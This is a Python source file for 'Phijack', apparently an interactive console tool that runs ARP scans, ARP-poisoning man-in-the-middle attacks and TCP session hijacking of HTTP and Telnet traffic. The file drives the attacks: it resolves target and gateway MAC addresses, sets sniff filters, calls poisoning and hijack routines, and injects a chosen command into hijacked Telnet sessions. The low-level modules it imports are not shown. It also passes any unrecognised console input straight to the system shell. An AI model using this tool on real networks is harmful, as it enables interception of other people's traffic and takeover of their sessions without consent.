from arp_poisoning import *
from tcp_hijacking import *
import globals

ASCII_ART = """
 ____    __                                 __         
/\  _`\ /\ \      __    __                 /\ \        
\ \ \_\ \ \ \___ /\_\  /\_\     __      ___\ \ \/'\    
 \ \ ,__/\ \  _ `\/\ \ \/\ \  /'__`\   /'___\ \ , <    
  \ \ \/  \ \ \ \ \ \ \ \ \ \/\ \_\.\_/\ \__/\ \ \\\\`\  
   \ \_\   \ \_\ \_\ \_\_\ \ \ \__/.\_\ \____\\\\ \_\ \_\\
    \/_/    \/_/\/_/\/_/\ \_\ \/__/\/_/\/____/ \/_/\/_/
                       \ \____/                        
                        \/___/       
"""


class Attack:
    def __init__(self, iface):
        self.iface = iface
        self.ip = get_if_addr(self.iface)
        self.mac = get_if_hwaddr(self.iface)


class ArpScan(Attack):
    def __init__(self, rhosts, iface):
        self.rhosts = rhosts
        super().__init__(iface)

    def __call__(self):
        print(f"[+] Scanning {self.rhosts}...")
        result = arp_scan(self.rhosts, self.iface)
        ip_to_MAC = {}

        for mapping in result:
            print(f"\t{mapping['IP']} => {mapping['MAC']}")
            ip_to_MAC[mapping['IP']] = mapping['MAC']

    @staticmethod
    def get_params():
        return {'RHOSTS': ''}


class MITM(Attack):
    def __init__(self, target, gateway, iface):
        self.target = target
        self.gateway = gateway
        super().__init__(iface)

    def recon(self):
        print(f"[+] Determining target and gateway MAC address.")

        result = arp_scan(self.target, self.iface)
        if not result:
            print("\tCannot determine target MAC address. Are you sure the IP is correct?")
            exit(1)
        else:
            targetMAC = result[0]['MAC']

        result = arp_scan(self.gateway, self.iface)
        if not result:
            print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
            exit(1)
        else:
            gatewayMAC = result[0]['MAC']

        # Define packet forwarding source and destination
        globals.GATEWAY_MAC = gatewayMAC
        globals._SRC_DST = {
            gatewayMAC: targetMAC,
            targetMAC: gatewayMAC,
        }

        print(f"[+] Performing ARP poisoning MITM.")
        return targetMAC, gatewayMAC


class ArpPoisoning(MITM):
    def __init__(self, target, gateway, iface):
        super().__init__(target, gateway, iface)

    def __call__(self):
        targetMAC, gatewayMAC = super().recon()

        sniff_filter = f"ip and (ether src {targetMAC} or ether src {gatewayMAC})"
        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, sniff_parser, sniff_filter, self.iface)

    @staticmethod
    def get_params():
        return {'TARGET': '', 'GATEWAY': ''}


class SessionHijacking(MITM):
    def __init__(self, target, gateway, iface, proto, cmd=None):
        self.proto = proto
        self.cmd = cmd
        super().__init__(target, gateway, iface)

    def __call__(self):
        targetMAC, gatewayMAC = super().recon()

        if self.proto == 'http':
            globals.PROTO = 'http'
            sniff_filter = f"ip and tcp port 80 and ether src {targetMAC}"

        elif self.proto == 'telnet':
            globals.PROTO = 'telnet'
            globals.CMD = self.cmd
            sniff_filter = f"ip and tcp port 23 and ether src {gatewayMAC}"

        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, sniff_filter, self.iface)

    @staticmethod
    def get_params():
        return {'TARGET': '', 'GATEWAY': '', 'PROTO': '', 'CMD': ''}


class CommandHandler:
    def __init__(self):
        self.iface = conf.iface
        self.attack = 'discover'
        self.attack_params = ArpScan.get_params()
        self.attacks = {
            'discover': ArpScan,
            'mitm': ArpPoisoning,
            'hijack': SessionHijacking
        }

    def print_parameters(self):
        """
        Prints basic and attack parameters configured
        """
        print("-" * 32)
        print("Basic Parameters:")
        print(f"\tIFACE => {self.iface}")
        print(f"\tATTACK => {self.attack}")

        print("Attack Parameters:")
        for param in self.attack_params:
            print(f"\t{param} => {self.attack_params[param]}")
        print("-" * 32)

    def parse_cmd(self, cmd):
        """
        Parse the user command.
        Returns True if quit, False otherwise.
        """
        if cmd.startswith("SET"):
            data = cmd.split()

            if len(data) < 3:
                raise ValueError("Expected: SET <key> <value>")

            key, value = data[1], ' '.join(data[2:])

            if key.lower() == 'iface':
                self.iface = value
                print(f"IFACE => {value}")

                globals.IFACE = self.iface
                globals.MY_MAC = get_if_hwaddr(globals.IFACE)
                globals.MY_IP = get_if_addr(globals.IFACE)

            elif key.lower() == 'attack':
                attack = value.lower()
                if attack in self.attacks:
                    self.attack = attack
                    self.attack_params = self.attacks[attack].get_params()
                    print("ATTACK => {}".format(self.attack))
                else:
                    raise ValueError(f"Unrecognized attack {attack}")

            elif key.upper() in self.attack_params:
                self.attack_params[key.upper()] = value
                print(f"{key.upper()} => {value}")

            else:
                raise ValueError(f"Unrecognized parameter: {key}")

        elif cmd == 'SHOW OPTIONS':
            self.print_parameters()

        elif cmd == 'EXPLOIT' or cmd == 'RUN':
            # check for empty/unset attack parameters
            if "" in self.attack_params.values():
                empty_params = [param for param, val in self.attack_params.items() if val == ""]
                raise ValueError(f"Empty parameters: {empty_params}")

            if self.attack == 'discover':
                attack = ArpScan(
                    self.attack_params['RHOSTS'],
                    self.iface
                )

            elif self.attack == 'mitm':
                attack = ArpPoisoning(
                    self.attack_params['TARGET'],
                    self.attack_params['GATEWAY'],
                    self.iface
                )

            elif self.attack == 'hijack':
                attack = SessionHijacking(
                    self.attack_params['TARGET'],
                    self.attack_params['GATEWAY'],
                    self.iface,
                    self.attack_params['PROTO'],
                    cmd=self.attack_params['CMD']
                )

            try:
                attack()
            except KeyboardInterrupt:
                print("Detected keyboard interrupt, ending attack.")

        elif cmd == 'QUIT' or cmd == "EXIT":
            return True

        else:
            # Allow system commands
            os.system(cmd)

        return False


def print_greeting():
    """
    Prints greeting message.
    """
    print(ASCII_ART)
    print("{:^55}".format("TCP SESSION HIJACKING"))
    print("{:^55}".format("Attacking and Defending HTTP and Telnet Sessions"))
    print("\n{:^55}\n".format("Please use this tool responsibly!"))


def main():
    print_greeting()

    globals.IFACE = conf.iface
    globals.MY_MAC = get_if_hwaddr(conf.iface)
    globals.MY_IP = get_if_addr(conf.iface)

    cmd_handler = CommandHandler()

    while True:
        try:
            if cmd_handler.parse_cmd(input('[Phijack] > ')):
                break

        except KeyboardInterrupt:
            print()
            print("Bye!")
            break

        except ValueError as e:
            print(e)


if __name__ == '__main__':
    main()
